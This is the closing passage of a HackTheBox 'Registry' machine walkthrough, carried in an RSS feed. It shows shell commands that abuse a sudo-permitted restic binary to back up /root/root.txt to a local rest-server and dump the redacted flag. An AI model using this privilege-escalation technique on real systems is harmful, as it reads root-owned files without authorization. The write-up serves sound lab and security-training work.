&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/dev/shm/server$ ../rest-server --path ${PWD}
Data directory: /dev/shm/server
Authentication disabled
Private repositories disabled
Starting server on :8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We need to create a repository on this server to stored the backup data.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/dev/shm/server$ restic init --repo rest:http://localhost:8000/
enter password for new repository: 
enter password again: 
created restic repository 417ad86527 at rest:http://localhost:8000/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that our repository is set, let’s send the root.txt file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:/dev/shm/ sudo /usr/bin/restic backup -r rest:http://localhost:8000/ -p pass_file /root/root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;We need to pass the -p argument because we’re not in a full tty shell, so if the program asks for an input (stdin) we would just lose our shell. The pass_file contains the password we set when we created the repository&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now that our flag is in our repository we just need to dump it&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/dev/shm$ restic -r rest:http://localhost:8000/ snapshots
enter password for repository: 
password is correct
ID        Date                 Host        Tags        Directory
----------------------------------------------------------------------
e8ce5ed2  2020-04-04 04:53:01  bolt                    /root/root.txt
----------------------------------------------------------------------
1 snapshots
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bolt@bolt:/dev/shm$ restic dump -r rest:http://localhost:8000/ e8ce5ed2 root.txt
enter password for repository: 
password is correct
ntrkzgnkota&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hope you enjoyed it  :-)&lt;/p&gt;

&lt;p&gt;by me&lt;/p&gt;
</description>
        <pubDate>Sat, 04 Apr 2020 00:00:00 -0300</pubDate>
        <link>http://localhost:4000/Registry-hackthebox-walkthrough/</link>
        <guid isPermaLink="true">http://localhost:4000/Registry-hackthebox-walkthrough/</guid>
        
        <category>HACKTHEBOX</category>
        
        <category>|</category>
        
        <category>DOCKER</category>
        
        <category>|</category>
        
        <category>BOLT</category>
        
        <category>|</category>
        
        <category>CMS</category>
        
        <category>|</category>
        
        <category>REGISTRY</category>
        
        <category>|</category>
        
        <category>HARD</category>
        
        
        <category>challenge</category>
        
      </item>
    
  </channel>
</rss>
